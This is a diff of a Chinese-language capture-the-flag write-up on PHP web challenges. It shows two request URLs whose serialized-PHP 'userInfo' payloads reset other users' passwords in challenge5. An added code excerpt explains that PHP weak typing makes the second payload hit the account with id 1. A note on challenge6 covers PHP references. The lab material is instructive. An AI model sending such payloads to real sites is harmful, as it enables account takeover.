@@ -27,6 +27,17 @@ PHP弱类型导致的BUG，当`$var`是一个字符串/数组的时候，访问`
 1. 访问`http://foobar/challenge5.php?userInfo=a:2:{s:2:"id";s:1:"8";s:4:"pass";s:12:"MAYBECHANGED";}&newPass=8`将账号jimbo18714的密码修改为8
 2. 访问`http://foobar/challenge5.php?userInfo=s:1:"8";&newPass=1`将ID为1的账号密码修改为1
 
+开始对2很迷,不知道为啥修改了id=1的用户的密码,而不是修改了id=8的,最后@yichin大牛指点之后才明白:
+
+```php
+if($oldPass == $userInfo['pass']){
+    $userInfo['pass'] = $newPass; //这里修改了$userInfo,改成了 1  
+    $query = 'UPDATE users SET pass = \''.mres($newPass).'\' WHERE id = \''.mres($userInfo['id']).'\';';
+    mysql_query($query);
+    echo 'Password Changed.';
+}
+``` 
+
 ### challenge6:
 PHP中引用的用法，将`$o->enter`设置为`$o->secret`的引用，这样更改`$o->secret`时`$o->enter`也会随之更改。p.s.乌云知识库上面那个思路完全是在扯淡。
 
